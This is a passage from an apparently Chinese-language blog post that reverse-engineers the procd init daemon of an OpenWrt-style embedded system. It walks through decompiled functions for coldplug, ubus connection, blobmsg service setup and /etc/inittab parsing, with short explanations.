class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Launched coldplug instance, pid=%d\n&quot;</span>, dword_1AE90);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Launched coldplug instance, pid=%d\n&quot;</span>, <span class="string">&quot;procd_coldplug&quot;</span>, <span class="number">65</span>, dword_1AE90);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整个函数的主要作用便是在系统启动时检测和初始化所有已连接的硬件设备，并add一个process sub_FA40</p><h3 id="sub-FA40"><a href="#sub-FA40" class="headerlink" title="sub_FA40"></a>sub_FA40</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_FA40</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Finished udevtrigger\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Finished udevtrigger\n&quot;</span>, <span class="string">&quot;udevtrigger_complete&quot;</span>, <span class="number">36</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_10C38</span>(sub_FA9C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致的还是一个log的记录，主要还是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_FA9C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Coldplug complete\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Coldplug complete\n&quot;</span>, <span class="string">&quot;coldplug_complete&quot;</span>, <span class="number">29</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v0 = <span class="built_in">sub_10C38</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_AE4C</span>(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又运行一次sub_AE4C函数</p><p>此时就是case2了</p><h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><h4 id="sub-8D60"><a href="#sub-8D60" class="headerlink" title="sub_8D60"></a>sub_8D60</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_BD60</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  dword_1AD5C = (<span class="type">int</span>)sub_BC18;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">uloop_timeout_set</span>(&amp;unk_1AD50, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_BC18</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">ubus_connect</span>(dword_1AD68);</span><br><span class="line">  dword_1AD6C = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(v0 + <span class="number">92</span>) = sub_BBFC;</span><br><span class="line">    <span class="built_in">sub_D610</span>();</span><br><span class="line">    <span class="built_in">sub_C79C</span>(dword_1AD6C);</span><br><span class="line">    <span class="built_in">sub_F99C</span>(dword_1AD6C);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Connected to ubus, id=%08x\n&quot;</span>, *(_DWORD *)(dword_1AD6C + <span class="number">80</span>));</span><br><span class="line">      <span class="built_in">fprintf</span>(</span><br><span class="line">        (FILE *)stderr,</span><br><span class="line">        <span class="string">&quot;procd: %s(%d): Connected to ubus, id=%08x\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ubus_connect_cb&quot;</span>,</span><br><span class="line">        <span class="number">58</span>,</span><br><span class="line">        *(_DWORD *)(dword_1AD6C + <span class="number">80</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">uloop_fd_add</span>(dword_1AD6C + <span class="number">44</span>, <span class="number">9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Connection to ubus failed\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Connection to ubus failed\n&quot;</span>, <span class="string">&quot;ubus_connect_cb&quot;</span>, <span class="number">48</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">uloop_timeout_set</span>(&amp;unk_1AD50, <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试连接到 <code>ubus</code>，并根据连接结果执行相应的初始化和事件处理设置。成功时，配置回调并将连接添加到事件循环；失败时，设置一个定时器以便稍后重试。</p><h4 id="sub-D4CC"><a href="#sub-D4CC" class="headerlink" title="sub_D4CC"></a>sub_D4CC</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_D4CC</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">blob_buf_init</span>(&amp;dword_1AD8C, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>((<span class="type">int</span>)<span class="string">&quot;name&quot;</span>, a1);</span><br><span class="line">  v4 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;instances&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;instance1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v6 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;command&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; ; i = <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">strtok</span>(i, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">sub_CE04</span>(<span class="number">0</span>, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v6);</span><br><span class="line">  v9 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;respawn&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>(<span class="number">0</span>, <span class="string">&quot;3600&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>(<span class="number">0</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>(<span class="number">0</span>, (<span class="type">char</span> *)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v9);</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v5);</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_D304</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, (<span class="type">char</span> *)<span class="string">&quot;add&quot;</span>, dword_1AD8C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过构建 <code>blobmsg</code> 消息来组织和传递数据。它<strong>创建一个包含实例和命令的结构</strong>，适用于需要复杂数据传递的场景。最终调用 <code>sub_D304</code> 处理该消息。</p><p>函数 <code>sub_D304</code> 处理服务请求，根据输入参数更新现有服务或创建新服务。</p><h4 id="sub-B458函数"><a href="#sub-B458函数" class="headerlink" title="sub_B458函数"></a>sub_B458函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_B458</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// r4</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// t1</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">regoff_t</span> *p_rm_eo; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">regoff_t</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">regoff_t</span> v8; <span class="comment">// r12</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r0</span></span><br><span class="line">  _DWORD *v18; <span class="comment">// r3</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+8h] [bp-88h]</span></span><br><span class="line">  <span class="type">regmatch_t</span> v20[<span class="number">5</span>]; <span class="comment">// [sp+10h] [bp-80h] BYREF</span></span><br><span class="line">  <span class="type">regex_t</span> preg; <span class="comment">// [sp+38h] [bp-58h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v22[<span class="number">14</span>]; <span class="comment">// [sp+58h] [bp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  stream = <span class="built_in">fopen</span>(<span class="string">&quot;/etc/inittab&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">regcomp</span>(&amp;preg, <span class="string">&quot;([a-zA-Z0-9]*):([a-zA-Z0-9]*):([a-zA-Z0-9]*):(.*)&quot;</span>, <span class="number">1</span>);<span class="comment">// 编辑一个正则表达式</span></span><br><span class="line">    v0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">    v1 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">LABEL_26:</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">fgets</span>(v0, <span class="number">128</span>, stream) )            <span class="comment">// 读取</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">strlen</span>(v0);</span><br><span class="line">      v3 = &amp;v0[v2];</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (<span class="type">unsigned</span> __int8)*--v3;</span><br><span class="line">        <span class="keyword">if</span> ( (*(_WORD *)(_ctype_b + <span class="number">2</span> * v4) &amp; <span class="number">0x20</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        --v2;</span><br><span class="line">      &#125;</span><br><span class="line">      v0[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v0 != <span class="string">&#x27;#&#x27;</span> &amp;&amp; !<span class="built_in">regexec</span>(&amp;preg, v0, <span class="number">5u</span>, v20, <span class="number">0</span>) )<span class="comment">// 忽略行首为#</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Parsing inittab - %s&quot;</span>, v0);</span><br><span class="line">          <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Parsing inittab - %s&quot;</span>, <span class="string">&quot;procd_inittab&quot;</span>, <span class="number">274</span>, v0);</span><br><span class="line">        &#125;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        p_rm_eo = &amp;v20[<span class="number">0</span>].rm_eo;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = *p_rm_eo;</span><br><span class="line">          v8 = p_rm_eo[<span class="number">1</span>];</span><br><span class="line">          p_rm_eo += <span class="number">2</span>;</span><br><span class="line">          v0[v7] = <span class="number">0</span>;</span><br><span class="line">          v22[v5++] = (<span class="type">int</span>)&amp;v0[v8];             <span class="comment">// 提取字段</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v5 != <span class="number">4</span> );</span><br><span class="line">        v9 = v1;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="built_in">strtok</span>((<span class="type">char</span> *)v22[<span class="number">3</span>], <span class="string">&quot; &quot;</span>); ; i = <span class="built_in">strtok</span>(<span class="number">0</span>, <span class="string">&quot; &quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = (<span class="type">int</span>)i;</span><br><span class="line">          ++v9;</span><br><span class="line">          <span class="keyword">if</span> ( i )</span><br><span class="line">            v12 = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v10 &gt; <span class="number">6</span> )</span><br><span class="line">            v12 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v12 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v9[<span class="number">2</span>] = i;</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        v13 = v22[<span class="number">0</span>];</span><br><span class="line">        v14 = (<span class="type">const</span> <span class="type">char</span> *)v22[<span class="number">2</span>];</span><br><span class="line">        v15 = <span class="number">0</span>;</span><br><span class="line">        v1[v10 + <span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v1[<span class="number">2</span>] = v13;</span><br><span class="line">        v1[<span class="number">11</span>] = v0;</span><br><span class="line">        <span class="keyword">while</span> ( v15 != <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = <span class="built_in">strcmp</span>((&amp;off_1AA58)[v16], v14); <span class="comment">// 匹配字段</span></span><br><span class="line">          v16 += <span class="number">3</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v17 )</span><br><span class="line">          &#123;</span><br><span class="line">            *v1 = &amp;off_1AA50;</span><br><span class="line">            v18 = off_1AA54;</span><br><span class="line">            off_1AA54 = v1;</span><br><span class="line">            v1[<span class="number">1</span>] = v18;</span><br><span class="line">            v1[<span class="number">12</span>] = &amp;(&amp;off_1AA58)[<span class="number">3</span> * v15];</span><br><span class="line">            *v18 = v1;</span><br><span class="line">            v0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">            v1 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);</span><br><span class="line">            <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">          &#125;</span><br><span class="line">          ++v15;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Unknown init handler %s\n&quot;</span>, v14);</span><br><span class="line">        <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Unknown init handler %s\n&quot;</span>, v14);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(stream);</span><br><span class="line">    <span class="built_in">free</span>(v0);</span><br><span class="line">    <span class="built_in">free</span>(v1);</span><br><span class="line">    <span class="built_in">regfree</span>(&amp;preg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to open %s\n&quot;</span>, <span class="string">&quot;/etc/inittab&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Failed to open %s\n&quot;</span>, <span class="string">&quot;/etc/inittab&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取&#x2F;etc&#x2F;inittab文件，匹配格式为 <code>identifier:runlevel:action:process</code> 的行，以处理服务初始化数据</p><h5 id="etc-inittab"><a href="#etc-inittab" class="headerlink" title="&#x2F;etc&#x2F;inittab"></a>&#x2F;etc&#x2F;inittab</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (c) 2013 The Linux Foundation. All rights reserved.</span></span><br><span class="line">::sysinit:/etc/init.d/rcS S boot</span><br><span class="line">::shutdown:/etc/init.d/rcS K shutdown</span><br><span class="line">ttyHSL1::askfirst:/bin/login</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*v1 = &amp;off_1AA50;</span><br><span class="line">v18 = off_1AA54;</span><br><span class="line">off_1AA54 = v1;</span><br><span class="line">v1[<span class="number">1</span>] = v18;</span><br><span class="line">v1[<span class="number">12</span>] = &amp;(&amp;off_1AA58)[<span class="number">3</span> * v15];</span><br><span class="line">*v18 = v1;</span><br><span class="line">v0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">v1 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);</span><br><span class="line"><span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line"><span class="keyword">goto</span> LABEL_26;</span><br></pre></td></tr></table></figure><p>可以看到这部分1AA50已然被修改了</p><p>之后执行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;respawn&quot;</span>);</span><br><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;askconsole&quot;</span>);</span><br><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;askfirst&quot;</span>);</span><br><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;sysinit&quot;</span>);</span><br></pre></td></tr></table></figure><p>想来算是只会执行最后一个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title">sub_B3F4</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">void</span> **i; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v1 = s2;</span><br><span class="line">  <span class="keyword">for</span> ( i = (<span class="type">void</span> **)off_1AA50; i != &amp;off_1AA50; i = (<span class="type">void</span> **)*i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="type">const</span> <span class="type">char</span> **)i[<span class="number">12</span>];</span><br><span class="line">    s2 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">strcmp</span>(*v3, v1);</span><br><span class="line">    <span class="keyword">if</span> ( !s2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v3[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v3[<span class="number">2</span>] )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> *)((<span class="built_in">int</span> (__fastcall *)(<span class="type">void</span> **))v4)(i);</span><br><span class="line">      s2 = (<span class="type">const</span> <span class="type">char</span> *)((<span class="built_in">int</span> (__fastcall *)(<span class="type">void</span> **))v4)(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行i[12]即sub_B398（sysinit对应的函数）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_B398</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(_DWORD *)(a1 + <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">sub_BB80</span>(*(_DWORD *)(a1 + <span class="number">16</span>), v4, sub_B394, a4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">syslog</span>(<span class="number">0</span>, <span 